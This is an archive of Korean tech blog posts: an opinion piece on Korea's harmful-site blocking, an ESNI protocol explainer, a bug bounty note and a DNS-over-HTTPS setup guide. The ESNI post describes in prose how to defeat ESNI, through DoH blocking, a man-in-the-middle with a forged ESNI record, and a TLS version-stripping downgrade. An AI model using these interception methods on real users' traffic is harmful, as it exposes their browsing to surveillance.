유해사이트 차단에 대한 생각도 좀 변하게 되었다. 이 글에서는 변화한 유해사이트 차단에 대한 내 생각에 대해서 써보려 한다.\n아직도 유해사이트 차단에 대한 말이 많은 것을 알고 있다. 대부분이 \u0026ldquo;성인인데 왜 국가 차원에서 성인물을 못보게 막느냐 인권 침해다\u0026rdquo; 라는 이유인 것 같다. 나도 얼마 전까지만 해도 유해사이트 차단에 반대하는 한명의 사람이었고, 충분히 이런 의견들에 대해서도 공감하고 있다. 웹 상에서는 충분히 많은 합법 성인물이 유통되고 있다. 아직 미성숙한 미성년자는 성인물들을 접할 수 없게 보호해야 하지만, 성인들이 성인물을 보는 것은 개인의 선택이고 존중받아야 한다. 하지만, 이러한 합법 성인물들 외에도 여러 불법적인 것들도 돌아다니고 있다. 인사불성이 된 사람을 대상으로 촬영하는 소위 골뱅이 영상, 보호해야할 대상인 아동을 대상으로 촬영하는 아동 포르노, 찍히는 사람의 의도와는 상관없이 유포되는 몰래 카메라 등이 다크웹 뿐만이 아니라 해외에선 합법이라는 Pxrnhub, Xxideos 등에서도 돌아다니고 있다. 이러한 영상물들은 보는사람의 성욕은 만족시켜줄지 몰라도 피해자들을 발생시키고 이러한 피해자들은 보호받지 못하고 있다. 나름 3대 욕구중 하나인 성욕을 각자의 방법으로 만족시키는 것은 좋지만, 이러한 피해자들을 만들면서까지 자신의 욕구를 채워서는 안된다. 이러한 영상물들 외에도 보는 사람의 정신을 망가뜨리는 고어한 영상들, 알게 모르게 거래되고있는 불법 약품들 등 표현의 자유는 지켜져야 하지만 어느정도의 선은 있어야 된다고 생각한다.\n유해사이트 차단은 분명 필요한 것이다. 모든 사람이 내 의견에 동의해 줬으면 하는 것은 아니다. 나도 성욕이 있는 한명의 사람이고 그 욕구를 채울 권리는 모두에게 있다고 생각한다. 하지만 위에 언급한 여러 피해들을 막기 위해서라도 유해사이트 차단은 이루어져야한다고 생각한다. 유해사이트 차단이 아닌 사람들의 인식 개선으로 이를 해결할 수 있다는 사람들도 있지만, 나는 그렇게 생각하지 않는다. 모든 사람이 그렇지는 않지만, 마약이 정신을 망가뜨리고 나쁘다는 것을 알고 있음에도 한 순간의 쾌락을 쫓아 마약을 하는 사람들이 존재하고, 자신이 하는 행동이 잘못된 것을 알고 있음에도 보는 눈을 피해 하는 일들이 많다. 수요가 없어진다면 저런 불법 행위들도 자연스럽게 없어질 것이다. 이러한 불법행위들은 강경하게 차단되어야 하지만, 동시에 합법적으로 사람들의 욕구를 채워줄 수 있는 방안이 마련되어야할 것이다.\n","permalink":"https://pol4bear.github.io/posts/about-harmful-website-blocking-in-korea/","summary":"유해사이트 차단에 대한 내 생각 2019년 9월부터 12월까지 거의 4달이라는 시간동안 유해사이트 차단에 대한 프로젝트를 진행했다. 이 프로젝트를 진행하기 전 내 생각도 남들과 다르지 않았다. 도대체 왜 성인인데 성인물을 못보게 막는지 도저히 이해할 수 없었고, 한명의 남자로써 성인물을 못보게 한다는 것이 분에 겨워 당시 청와대 홈페이지에서 청원하던 유해사이트 차단 반대 청원에도 서명도 했었다. 프로젝트를 진행하면서 나왔던 결과물이 디씨인사이드라는 커뮤니티에 노출됐었다. 이메일로 인터넷 검열의 앞잡이냐, 해명해라 등의 이메일을 받아서 읽어보면서 새삼 아직도 유해사이트에 대한 사람들의 인식을 다시 깨닫게 되었다.","title":"유해사이트 차단에 대해서"},{"content":"서론 2019년 3월 우리나라에서 SNI 기반의 유해사이트 방식이 적용되고나서 GoodbyeDPI, 스나이퍼, 유니콘 등과 더불어 ESNI가 새로운 유해사이트 차단 우회 방식으로 사용되고 있다. 아무리 ESNI가 개인정보 침해를 막아준다고 하지만 인터넷 검열을 하지 않는 나라들은 필요로 하지 않을 것이고, 검열을 하는 나라들은 우리나라와는 비교하지 못할 만큼 더 세게 검열하기 때문에 우리나라를 제외한 다른 나라들에서는 그다지 매력있는 기술이 아닌 것 같다.\nESNI는 프라이버시적으로 정말 좋은 기술인 것 같다. 또한 SNI 차단 장비들이 업데이트되어 우회할 수 있는 방법이 ESNI와 VPN이나 프록시밖에 남지 않는다면 특히 우리나라 사람들에게는 사랑받는 기술이 될 것이다. ESNI가 표준으로 발전하고 공식적으로 사용되기 시작한다면 암호화된 내용을 복호화해볼 수 없는 우리나라에서는 유해사이트를 차단하기 어려울(불가능하다고는 하지 않겠다) 것이다. 아마 조만간 빈번하게 사용될 ESNI란 기술에 대해서 한번 알아보자.\nSNI란? ESNI에 대해 알아보기 전에 SNI를 먼저 알아야 한다. HTTPS가 통신에서 클라이언트는 서버와 통신 전에 어떤 방식으로 암호화할지, 어떤 방식으로 키를 교환할지, 어떤 SSL/TLS 버전을 사용할지 정하기 위해 Handshake 통신을 진행한다.\nHandshake 과정에서 클라이언트는 서버의 인증서를 전송받게 되는데 그 인증서로 자신이 맞는 서버로 접속하는 것인지 검증하게 된다. 서버는 클라이언트에게 적절한 인증서를 전송해줘야 한다. 예를 들어 하나의 서버에서 페이스북과 트위터 두 개의 서비스를 제공한다고 생각해보자. 클라이언트가 연결할 때 어디에 접속하는지 표시를 해두지 않는다면 서버는 페이스북, 트위터 둘 중 어떤 인증서를 전송할 지 경정할 수 없을 것이다. 이 문제를 해결하기 위해 TLS extension인 SNI(Server Name Indication)가 RFC 3546에서 등장했다.\n\u0026ldquo;server_name\u0026rdquo; extension \u0026ldquo;server_name\u0026rdquo; extension의 Type은 00 00이다. 첫 4바이트 Type과 전체 길이는 모든 TLS extension이 공통적으로 가진 필드다.\nESNI란? SNI가 사용되기 시작하면서 서버 뿐만이 아니라 제 3자도 클라이언트가 어디에 접속하려는지 쉽게 알아낼 수 있다는 단점이 생겼다. 통신되는 내용 자체는 암호화되어 알 수 없다고 하더라도 \u0026ldquo;어떤 IP 주소를 가진 사람이 어떤 사이트에 빈번하게 접속하더라\u0026rdquo; 이런 식으로 클라이언트가 어디에 접속하는가만 수집하더라도 충분히 개인정보 침해가 될 수 있다. 실제로 우리나라는 2019년 3월경 HTTP Host 필드를 보고 유해사이트를 차단해서 HTTPS는 차단할 수 없었던 상황에서 SNI 를 적극적으로 이용한 SNI 차단방식을 사용하여 HTTPS 통신 또한 차단하고 있다. 외국에서도 이런 개인정보 침해 관련해서 문제가 있었는지 이 SNI 정보를 암호화할 수 있는 ESNI Extension이 등장했다.\nEncrypted Server Name Indication 즉, ESNI는 아직 TLS 1.3의 표준이 아닌 draft인 상태다. 대부분의 SSL/TLS 라이브러리가 아직 ESNI를 지원하고 있지 않지만, Mozilla의 Firefox 브라우저를 이용하면 ESNI를 사용할 수 있다. 서버의 경우 Cloudflare의 프록시를 사용하면 적용이 가능하다.\nESNI의 핵심적인 내용은 TLS 통신이 이루어지기 전 어떻게 키를 교환할 것인지다. 결국 SNI를 암호화하려면 암호화 키가 필요한데 ESNI는 이 키 관련 문제를 TLS 통신 전 DNS 서버에서 받아오는 방식으로 이 문제를 해결했다. ESNI의 동작 방식은 다음과 같다.\nESNI의 동작 방식 1. 서버 - ESNI 레코드 DNS 서버에 보관하기 ESNI를 제공할 서버는 ESNI 레코드 생성에 앞서 SNI 암호화 키 생성에 사용될 자신의 키 쌍을 생성한다. 그리고, 앞서 생성한 자신의 키 쌍 중 공개 키와 ESNI 버전, Cipher Suite, 유효기간 등 SNI를 암호화할 때 필요한 정보들이 포함된 ESNI 레코드를 생성한 후 Base 64로 인코딩해서 DNS 서버에 보관한다. 단, ESNI 레코드는 _esni.[호스트 이름]에 TXT 레코드로 보관해야 한다.\n_esni.pol4.dev. IN TXT /wEvzh0pACQAHQAgMU5QtkenanuH/Oq2R5sZGt1O8zzZWhUBqala5sduaUIAAhMBAQQAAAAAXlkO0AAAAABeYPfQAAA= 2. 클라이언트 - DNS 서버에서 ESNI 레코드 가져오기 클라이언트는 SNI 암호화에 앞서 DNS 서버에 보관되어 있는 ESNI 레코드를 가져와야 한다. 서버의 IP를 얻어오는 DNS질의와는 별개로 TXT 레코드로 저장되어 있는 ESNI 레코드를 가져와서 ESNI 버전과 ESNI 레코드가 만료되지는 않았는지 확인하고, SNI 암호화 키 생성에 사용되는 서버의 공개 키를 얻어낸다.\n3. 클라이언트 - ESNI를 포함한 Client Hello 전송하기 클라이언트는 DNS 서버에서 가져온 ESNI 레코드의 서버 공개 키와 공유 비밀을 사용하기 위한 임시 키 쌍을 생성한다. 생성한 임시 키와 서버 공개 키를 이용해 생성한 공유 비밀로 SNI 암호화 키를 생성해서 SNI를 암호화한다. 암호화된 SNI는 Client Hello의 \u0026ldquo;encrypted_server_name\u0026rdquo; extension에 포함시켜 서버에 전송한다.\n4. 서버 - 암호화된 SNI 복호화하고 Server Hello 전송하기 서버는 Client Hello의 \u0026ldquo;encrypted_server_name\u0026rdquo; extension에 있는 클라이언트 임시 공개 키와 ESNI 개인 키(ESNI 레코드의 서버 공개 키와 쌍)를 이용하여 SNI 암호화 키를 생성한다. 생성한 암호화 키를 사용하여 암호화된 SNI를 복호화한 뒤 그에 맞는 Server Hello를 클라이언트에게 전송한다.\n\u0026ldquo;encrypted_server_name\u0026rdquo; extension 위와 같은 과정을 거치면 Client Hello에 \u0026ldquo;encrypted_server_name\u0026rdquo; extension을 사용할 수 있게 된다. ESNI 초안 5. The \u0026ldquo;encrypted_server_name\u0026rdquo; extension에 따르면 TLS extension Type ff ce인 \u0026ldquo;encrypted_server_name\u0026rdquo; extension의 구조는 다음과 같다.\nstruct { CipherSuite suite; KeyShareEntry key_share; opaque record_digest\u0026lt;0..2^16-1\u0026gt;; opaque encrypted_sni\u0026lt;0..2^16-1\u0026gt;; } ClientEncryptedSNI; CipherSuite suite: 암호화에 사용된 Cipher Suite KeyShareEntry key_share: SNI 암호화 키 생성에 사용된 Key Share opaque record_digest: SNI 키 생성에 사용한 ESNIKeys의 해쉬값 해쉬 알고리즘은 Cipher Suite에 포함되어 있다. opaque encrypted_sni: 암호화된 SNI 실제 ESNI를 사용했을 때 \u0026ldquo;encrypted_server_name\u0026rdquo; extension은 다음과 같다.\nESNI 자세히 알아보기 ESNI 레코드 ESNI 초안 4.1 암호화된 SNI 레코드에 따르면 ESNI 레코드의 구조는 다음과 같다.\n// Copied from TLS 1.3 struct { NamedGroup group; opaque key_exchange\u0026lt;1..2^16-1\u0026gt;; } KeyShareEntry; struct { uint16 version; opaque public_name\u0026lt;1..2^16-1\u0026gt;; KeyShareEntry keys\u0026lt;4..2^16-1\u0026gt;; CipherSuite cipher_suites\u0026lt;2..2^16-2\u0026gt;; uint16 padded_length; Extension extensions\u0026lt;0..2^16-1\u0026gt;; } ESNIKeys; struct { ESNIKeys esni_keys; Extension dns_extensions\u0026lt;0..2^16-1\u0026gt;; } ESNIRecord; KeyShareEntry 구조 ESNIKeys 구조체 SNI를 암호화하는데 실제 사용되는 키와 일부 메타데이터를 포함한다.\nuint16 version: 접속에 사용해야하는 ESNI 버전\nopaque public_name: 암호화 키를 갱신하기 위해 사용되는 신뢰할 수 있는 개체의 이름\n잘못된 설정을 되돌릴 때 쓰인다. KeyShareEntry keys: ESNI 연결에 사용할 수 있는 서버 공개 키 목록\n각 키들은 다른 그룹을 가지고 있어야한다. CipherSuite cipher_suites: SNI 암호화에 사용할 수 있는 Cipher Suite 목록\nuint16 padded_length: SNI를 암호화하기 전 패딩한 서버 이름 목록의 크기\n서버가 지원할 것으로 예상되는 가장 큰 서버 이름 목록을 16의 배수와 가깝게 반올림한 크기와 같게 설정해야한다. 만약 서버가 임의의 와일드카드 서버 이름들을 지원한다면 260으로 설정해야한다. 클라이언트는 padded_length가 260보다 클 경우 ESNIKeys를 무시해야한다. 패딩을 하여 서버 이름 목록의 길이를 고정시키는 이유는 공격자가 암호화된 서버 이름 목록의 길이로 서버 이름을 예측할 수 없게 만들기 위해서다. Extension extensions: 클라이언트가 Client Hello를 만드는데 사용할 수 있는 TLS extension의 목록\n향후 추가적인 기능을 제공하기 위한 공간으로 사용한다. extension은 Type의 MSB를 1로 설정함으로써 Client Hello 필수적으로 포함시키게 할 수 있다. 클라이언트는 필수 extension으로 설정된 extension 중 extension이 있으면 해당 ESNIKeys를 무시해야한다. ESNIRecord 구조체 ESNIKeys esni_keys: SNI를 암호화하는데 실제 사용되는 키와 그 키와 관계된 여러 메타데이터들 Extension extensions: 클라이언트가 서버의 DNS 이름을 질의할때 참고할 수 있는 TLS extension의 목록 향후 추가적인 기능을 제공하기 위한 공간으로 사용한다. extension은 Type의 MSB를 1로 설정함으로써 Client Hello 필수적으로 포함시키게 할 수 있다. 클라이언트는 필수 extension으로 설정된 extension 중 extension이 있으면 해당 ESNI 레코드를 무시해야한다. 추가 정보 서버는 여러개의 ESNI 레코드를 제공함으로써 여러 버전의 ESNI를 제공할 수 있다. ESNI 레코드들 중 클라이언트가 모르는 ESNI 버전을 가진 ESNI 레코드가 있다면 클라이언트는 그 레코드를 무시해야한다. 하지만 대부분의 서버가 하나의 ESNI 레코드만 전송해주는 상태다.\nESNI 초안 05 버전에서 ESNIKeys는 ESNIConfig로 용어가 변경되었다. 또한, DNS를 이용하는 방법은 HTTPSSVC라는 DNS를 이용해서 추가적인 정보를 제공하는 QUIC, ESNI 등 기술들을 위한 기술을 사용하는 것으로 변경되었다. 하지만 아직까진 01 버전 등 이전 버전의 초안으로 구현되어 운용되고 있다. ESNI도 그렇고 HTTPSSVC도 그렇고 아직 초안인 만큼 어떻게 변경될지는 아무도 모른다.\nESNI 레코드에서 정보 취득하기 ESNI 레코드 가져오기 데이터를 파싱할 ENSI 레코드는 다음 명령어로 가져올 수 있다. 아래 명령어로 가져온 ESNI 레코드는 Base 64로 인코딩되어있는 상태다.\nnslookup -type=txt _esni.cloudflare.com ESNI 레코드 디코딩하기 ESNI 레코드를 처음 가져오면 Base 64로 인코딩되어있다. 가져온 ESNI 레코드를 디코딩해서 실제 ESNI 레코드 값을 얻어낼 수 있다. 버프 슈트의 Decoder를 사용하면 쉽게 디코딩할 수 있다.\nESNI 레코드에서 정보 취득하기 ESNI 레코드 디코딩하기를 통해 얻은 ESNI 레코드는 다음과 같다.\nff 01 13 0f a6 4a 00 24 00 1d 00 20 3f 3e c9 d5 c4 62 f9 4e 1b 81 a3 cd f2 ca 4d bb 98 fa 78 2c cc 88 8b ce 82 98 1c 33 f6 12 c7 5f 00 02 13 01 01 04 00 00 00 00 5e 5a 1a 00 00 00 00 00 5e 62 03 00 00 00 DNS에 올라가있는 ESNI 레코드는 ESNIKeys 구조체와 다르게 체크섬과 길이 필드들이 추가되어있다. ESNI 레코드의 모든 숫자 형식 데이터의 바이트 오더는 빅 엔디언으로 되어있다. ESNI 레코드는 아래 테이블과 같은 구조를 취하고 있다.\nESNI 레코드에서 정보를 취득할 때 필드 별로 확인할 것은 다음과 같다.\nESNIKeys의 체크섬을 0으로 채운 뒤 SHA 256으로 해쉬한 해쉬값의 최상위 4바이트와 기존 체크섬이 다르다면 변조된 데이터다. Keys는 복수의 KeyShareEntry로 이루어져 있다. Not Before, Not After은 Unix time으로 되어있다. 위 구조를 따라 ESNI 레코드에서 취득한 정보는 다음과 같다.\nSNI 암호화 키 생성 SNI를 암호화하기에 앞서 암호화 키를 생성해야한다. 서버라면 Client Hello로, 클라이언트라면 DNS에서 받아온 ESNIKeys로 상대방의 공개키를 가지고 있을 것이다. SNI 암호화 키를 생성을 위해 자신의 개인키와 상대방의 공개키로 공유 비밀인 키를 유도해낸다. OpenSSL을 사용할 경우 int EVP_PKEY_derive(EVP_PKEY_CTX *ctx, unsigned char *key, size_t *keylen)를 사용하면 되고, 이때 유도된 키인 공유 비밀을 Z라고 한다. 그 후 Z로부터 HKDF을 이용하여 SNI 암호화 키를 아래와 같이 생성할 수 있다.\nZx = HKDF-Extract(0, Z) key = HKDF-Expand-Label(Zx, KeyLabel, Hash(ESNIContents), key_length) iv = HKDF-Expand-Label(Zx, IVLabel, Hash(ESNIContents), iv_length) 첫 Client Hello에는 KeyLabel을 \u0026ldquo;esni key\u0026quot;로, IVLabel을 \u0026ldquo;esni iv\u0026quot;로 설정한다. 클아이언트의 두 번째 Client Hello 즉, 첫 번째 Client Hello에 문제가 있어서 Hello Retry Request를 보낸/받은 뒤에는 KeyLabel을 \u0026ldquo;hrr esni key\u0026quot;로, IVLabel을 \u0026ldquo;hrr esni iv\u0026quot;로 설정한다.\nSNI 암호화하기 SNI 암호화 키 생성 후 암호화에 필요한 것은 다음과 같다.\nRecord Digest: 암호화할 때 사용한 ESNIKeys의 해쉬값 ESNI Key Share: SNI 암호화 키를 생성할 때 사용된 자신의 공개키 TLS Key Share: Client Hello \u0026ldquo;key_share\u0026rdquo; extension에 있는 자신의 공개키 cut-and-paste 공격을 방지하기 위해서 AAD로 사용한다. 랜덤: Client Hello의 랜덤 위 요소가 준비되었다면 클라이언트는 암호화할 서버 이름에 패딩을 적용하고 CientESNIInner 객체를 만들어야 한다. 패딩을 한 후 길이가 ESNIKeys의 padded_length와 같아야 한다.\nstruct { opaque dns_name\u0026lt;1..2^16-1\u0026gt;; opaque zeros[ESNIKeys.padded_length - length(dns_name)]; } PaddedServerNameList; struct { uint8 nonce[16]; PaddedServerNameList realSNI; } ClientESNIInner; nonce: 서버로부터 되돌려 보내질 랜덤한 16 바이트 값 dns_name: server_name extension에 들어가는 서버 이름 목록 zeros: 0으로 된 패딩. 패딩의 크기는 ESNIKeys의 padded_length에 의해 결정된다. ClientESNIInner가 준비되었다면 이 값을 AEAD-Encrypt로 암호화하면 된다.\n자세한 내용은 ESNI 초안 5.1.1 암호화된 SNI 보내기 참고\nGitHub sftcd/openssl 리포지토리에 ESNI 암호화/복호화 함수가 구현되어 있다.\n암호화된 SNI를 복호화하기 SNI 암호화하기에서 암호화에 사용된 모든 데이터는 Client Hello에 들어있다. SNI 암호화 키 생성 이후 Client Hello에 있는 \u0026ldquo;encrypted_server_name\u0026rdquo; extension과 Random, \u0026ldquo;key_share\u0026rdquo; extension을 가져와서 AEAD-Decrypt 하면 복호화가 가능하다.\nESNI를 사용하면 유해사이트 차단이 어려운 이유 우리나라에서는 유해사이트 차단을 하고 있고, 여러 회사에서도 비업무사이트를 막기 위해 노력하고 있다. 하지만, ESNI가 본격적으로 적용되면 지금까지 적용하고 있던 차단 방법들은 사용하기 어려울 것이다. 일단 우리나라의 경우 차단 방식으로 정공법이 아닌 꼼수를 이용한 차단을 하진 못할 것이다. 꼼수로 차단을 진행한다면 언제든지 패치될 가능성이 있기 때문에 결국 고려할 수 있는 방법은 정공법인 ESNI MITM인데 보면 알겠지만 국가 단위로 특히 우리나라에서 적용하긴 어려운 기술이다.\n회사들의 경우 SSL 가시성을 확보하는 형태로 비업무사이트를 차단하고 있을 것인데, 결국 HTTPS 통신에 문제가 없게 하기 위해서 루트 인증서를 설치해두더라도 SSL 가시성 확보 장비에서 SNI를 확인하는 형태로 따로 접속하는 사이트에 대한 인증서를 배포하고 있을 것이다. 하지만, 인증서를 배포하기위해 참고하고 있던 SNI가 암호화되어버리니 SSL 가시성 장비에서 ESNI MITM 기능을 제공해야할 것이다.\nESNI가 사용된 통신을 차단하는 방법 DoH를 차단하는 방법 현재까지 ESNI를 공식적으로 지원하는 브라우저는 Firefox밖에 없다. Firefox는 DoH를 사용하지 않으면 ESNI를 사용할 수 없게 되어있기 때문에 DoH만 차단해도 쉽게 ESNI를 차단할 수 있다. 물론, 정공법이 아닌 꼼수인데다 다른 브라우저들이 ESNI를 지원하고 그 브라우저들 중 DoH가 필수 옵션이 아닌 브라우저가 있다면 효과가 없을 것이다.\nESNI를 MITM하는 방법 일단, 클라이언트가 ESNI 레코드를 DNS 서버에 요청했을 때 내가 만든 ESNI 레코드를 응답해야 한다. 요청 패킷은 내가 무조건 DNS 서버보다 먼저 응답해줄 수 있다면 나둬도 되지만 아니라면 드랍하도록 한다. 나머지는 널리 알려진 TLS MITM과 비슷한 방식으로 동작한다. 클라이언트가 SNI를 암호화했더라도 내가 응답해준 ESNI 레코드(키)를 사용해서 암호화했기 때문에 중간에서 복호화할 수 있다. 하지만, 그렇다고 그 Client Hello 패킷을 그대로 서버에게 보내주면 서버는 SNI를 복호화할 수 없기 때문에 프록시 느낌으로 서버로 별도로 요청하고 응답을 받아와야한다. 그 후 서버로부터 받은 응답을 그대로 클라이언트에게 전달해주면 된다. 별도로 서버로 요청할 때는 굳이 ESNI를 사용하지 않아도 된다. ESNI MITM이 정상적으로 동작하기 위해선 어떤 클라이언트(IP, Port)가 어디로 접속했는지를 모두 분석해서 기억하고 있어야 한다.\nESNI MITM은 정공법이기 때문에 ESNI를 사용하는한 우회할 수 없다. 하지만, 소규모 네트워크에는 적용하기 쉽지만, 대규모 네트워크에는 컴퓨터 자원 문제, 모든 네트워크 트래픽을 분석해야 된다는 문제 때문에 적용하기 어렵다. 물론 ISP는 마음만 먹으면 모든 네트워크 트래픽을 확인할 수 있지만, 무엇보다 MITM은 엄연히 해킹이기 때문에 법적으로도 유해사이트 차단 방법으로는 사용할 수 없을 것이다. 모든 것을 감수하더라도 QoS 때문에 ISP에서는 절대 문제가 생길 수 있는 In-Path 방식의 솔루션은 적용하지 못할 것이다.\nTLS 인증서를 이용하는 방법 HTTPS 통신을 차단하는 방법은 SNI를 이용하는 방법 외에도 인증서에 있는 Issued To의 CN 필드를 이용하는 방법도 있다. 하지만, ESNI가 사용가능한 TLS 1.3 부터는 인증서도 암호화해서 전송하기 때문에 일반적인 방법으로는 사용이 불가능하다. 현재는 패치되어 사용할 수 없는 방법이지만 원리는 다음과 같다.\nTLS 인증서를 평문으로 받아보기 위해선 TLS의 버전을 다운그레이드해야 한다. TLS 통신 중 Client Hello 패킷을 보면 supported_versions extension이 포함되어 있는데, 이 데이터로 실제 TLS 통신의 버전이 결정된다. supported_versions extension에 있는 버전 목록에서 TLS 1.3을 제거한 후 Client Hello 패킷을 ESNI 서버에 보낸다면, ESNI 서버는 암호화된 SNI를 복호화해서 SNI를 얻어낸 후 사용할 수 있는 버전 중 가장 높은 TLS 1.2로 통신을 진행한다. TLS 1.2는 인증서를 암호화하지 않기 때문에 앞서 말한 Issued To의 정보를 이용해서 차단이 가능하다.\n직접 ESNI 패킷을 발생시키지 않고도 가능한데, encrypted_sni extension이 포함된 패킷에서 TLS 1.3을 제거한 후 그대로 전송해도 암호화되지 않은 인증서를 받아볼 수 있다. 편법이기 때문에 패치되었지만, 패치되지 않았다면 HTTPS 차단 방법으로도 이용이 가능했을 것이다.\n","permalink":"https://pol4bear.github.io/posts/what-is-esni/","summary":"서론 2019년 3월 우리나라에서 SNI 기반의 유해사이트 방식이 적용되고나서 GoodbyeDPI, 스나이퍼, 유니콘 등과 더불어 ESNI가 새로운 유해사이트 차단 우회 방식으로 사용되고 있다. 아무리 ESNI가 개인정보 침해를 막아준다고 하지만 인터넷 검열을 하지 않는 나라들은 필요로 하지 않을 것이고, 검열을 하는 나라들은 우리나라와는 비교하지 못할 만큼 더 세게 검열하기 때문에 우리나라를 제외한 다른 나라들에서는 그다지 매력있는 기술이 아닌 것 같다.\nESNI는 프라이버시적으로 정말 좋은 기술인 것 같다. 또한 SNI 차단 장비들이 업데이트되어 우회할 수 있는 방법이 ESNI와 VPN이나 프록시밖에 남지 않는다면 특히 우리나라 사람들에게는 사랑받는 기술이 될 것이다.","title":"알아둬도 쓸데없는 신비한 ESNI"},{"content":"\rBoB 8기 DMG팀(이경문 멘토님, 최원영 멘토님, 김명수 PL님, 김현홍, 박민지, 이현수, 지재형, 최상희)에서 프로젝트를 진행하면서 ESNI를 무력화하는 취약점을 발견하여 난생 처음으로 버그 바운티를 했다.\nESNI가 본격적으로 도입이 되면 네트워크 레벨에서 사용자가 어느 사이트에 접속하는지를 알기가 힘들다. 그런데 네트워크 레벨에서 조금 특이한 방법을 사용하면 어느 사이트에 접속하는지를 알아낼 수 있다는 일종의 취약점을 발견하여서 해커원에 제보했다.\n멘토링 해주셨던 이경문 멘토님 말씀으로는, 보통 네트워크 레벨의 취약점은 벤더를 특정하기 어려워서 보상이 이루어지지 않는 것이 일반적이라고 한다. 그런데, Cloudflare에서 취약점을 인정해주어서 결과적으로 성공적인 취약점 제보였다.\n해당 취약점은 OpenSSL을 포함한 대부분의 SSL(TLS) 모듈에서도 적용되는 취약점이기 때문에 Cloudflare만의 취약점으로 보기는 어렵다. 해당 취약점에 대한 내용은 여기에서 확인할 수 있다.\n","permalink":"https://pol4bear.github.io/posts/esni-vulnerability-bug-bounty/","summary":"BoB 8기 DMG팀(이경문 멘토님, 최원영 멘토님, 김명수 PL님, 김현홍, 박민지, 이현수, 지재형, 최상희)에서 프로젝트를 진행하면서 ESNI를 무력화하는 취약점을 발견하여 난생 처음으로 버그 바운티를 했다.\nESNI가 본격적으로 도입이 되면 네트워크 레벨에서 사용자가 어느 사이트에 접속하는지를 알기가 힘들다. 그런데 네트워크 레벨에서 조금 특이한 방법을 사용하면 어느 사이트에 접속하는지를 알아낼 수 있다는 일종의 취약점을 발견하여서 해커원에 제보했다.\n멘토링 해주셨던 이경문 멘토님 말씀으로는, 보통 네트워크 레벨의 취약점은 벤더를 특정하기 어려워서 보상이 이루어지지 않는 것이 일반적이라고 한다.","title":"ESNI 무력화 취약점 버그 바운티 후기"},{"content":"DNS over HTTPS 서버의 동작 방식 Nginx가 Client로부터 요청된 DNS-over-HTTPS 요청을 복호화한 DNS-over-HTTP 요청을 doh-server에 전송 doh-server는 1번의 DNS-over-HTTP 요청을 DNS 요청으로 변환해서 DNS 서버에 전송 DNS 서버는 2번의 DNS 요청을 받아들임 DNS 서버는 3번의 DNS 요청에 대한 응답을 doh-server에 전송 doh-server는 3번의 DNS 응답을 DNS-over-HTTP 응답으로 변환해서 Nginx에 전송 Nginx는 4번의 DNS-over-HTTP 응답을 암호화한 DNS-over-HTTPS 응답을 Client에 전송 DNS over HTTPS 서버 구성 DNS Server(DNSCrypt-proxy or bind9): DNS 요청 처리 및 응답 doh-server: DNS-over-HTTP 요청 처리 및 응답 Nginx: HTTPS 요청 처리 및 응답 DNS 서버 설치 및 설정하기 다른 DNS 서버를 경유하는 방법(DNSCrypt-proxy)\n장점: 검증된 서버(Google, Cloudflare 등)에서 보안성이 좋은 프로토콜(DNSCrypt, DoH, DoT 등)로 DNS 응답을 받아올 수 있다.\n단점: zone 파일을 직접 관리할 수 없다.\nDNSCrypt-proxy를 설치한다.\nsudo add-apt-repository ppa:shevchuk/dnscrypt-proxy sudo apt install dnscrypt-proxy /etc/dnscrypt-proxy/dnscrypt-proxy.toml에서 경유할 서버를 설정한다.\nserver_names = [\u0026#39;google\u0026#39;, \u0026#39;cloudflare\u0026#39;] DNSCrypt-proxy 데몬을 시작한다. 기본 시작 아이피/포트는 127.0.2.1:53이다.\nsudo systemctl start dnscrypt-proxy # dnscrypt-proxy를 시작 서비스로 등록 sudo systemctl enable dnscrypt-proxy 로컬 DNS 서버를 설정하는 방법(bind9)\n장점: zone 파일을 직접적으로 관리할 수 있다.\n단점: zone 파일을 가지고 있지 않은 요청에 대해서 recursive하게 다른 DNS 서버에게 물어볼 때 일반 DNS 프로토콜을 사용하기 때문에 보안성이 좋지 않다.\nbind9을 설치 후 시작한다.\nsudo apt install bind9 sudo systemctl start bind9 # bind9을 시작 서비스로 등록 sudo systemctl enable bind9 doh-server 설치 및 설정하기 golang(\u0026gt;=1.10)과 git을 설치한다.\nsudo apt install golang git git으로 doh-server를 clone한다.\ngit clone https://github.com/m13253/dns-over-https.git doh-server를 빌드하고 설치한다.\ncd dns-over-https mkdir gopath export GOPATH=$PWD/gopath make \u0026amp;\u0026amp; sudo make install doh-server 설정파일에서 DNS-over-HTTP 요청을 받을 포트를 설정한다.\n# /etc/dns-over-https/doh-server.conf listen = [ \u0026#34;127.0.0.1:8053\u0026#34;, \u0026#34;[::1]:8053\u0026#34;, ## To listen on both 0.0.0.0:8053 and [::]:8053, use the following line # \u0026#34;:8053\u0026#34;, ] doh-server 설정파일에서 DNS 응답을 받아올 서버를 설정한다.\n# /etc/dns-over-https/doh-server.conf # DNSCrypt-proxy 사용 시 upstream = [ \u0026#34;udp:127.0.2.1:53\u0026#34;, \u0026#34;tcp:127.0.2.1:53\u0026#34;, ] # bind9 사용 시 upstream = [ \u0026#34;udp:127.0.0.1:53\u0026#34;, \u0026#34;tcp:127.0.0.1:53\u0026#34;, ] doh-server를 시작한다.\nsudo systemctl start doh-server # doh-server를 시작 서비스로 등록 sudo systemctl enable doh-server Nginx 설치 및 설정하기 가장 최근 stable 버전의 Nginx를 설치한다.\nsudo add-apt-repository ppa:ondrej/nginx sudo apt install nginx-full DNS over HTTPS 사이트 설정파일을 생성하고 아래 내용을 넣고 저장한다. 대괄호([])로 되어있는 설정은 유동적으로 해야한다.\n# /etc/nginx/sites-available/dns-voer-https upstream dns-backend { server 127.0.0.1:8053; } server { listen 80; server_name [DNS 도메인]; root /var/www/html/dns; access_log /var/log/nginx/dns.access.log; location /dns-query { proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $http_host; proxy_set_header X-NginX-Proxy true; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_redirect off; proxy_set_header X-Forwarded-Proto $scheme; proxy_read_timeout 86400; proxy_pass http://dns-backend/dns-query ; } } 2번에서 생성한 사이트 설정을 활성화한 후 실행한다.\nsudo ln -s /etc/nginx/sites-available/dns-over-https /etc/nginx/sites-enabled/dns-over-https # 설정에 오류가 없는지 확인 sudo nginx -t sudo systemctl start nginx 인증서를 발급받기 위해 Certbot을 설치한다.\nsudo add-apt-repository ppa:certbot/certbot sudo apt install certbot python-certbot-nginx Certbot으로 DNS 도메인을 위한 인증서를 발급받는다. Nginx 설정까지 Certbot이 해준다! Certbot 서버에서 발급 대상 도메인에 HTTP 접속을 시도할 수 없으면 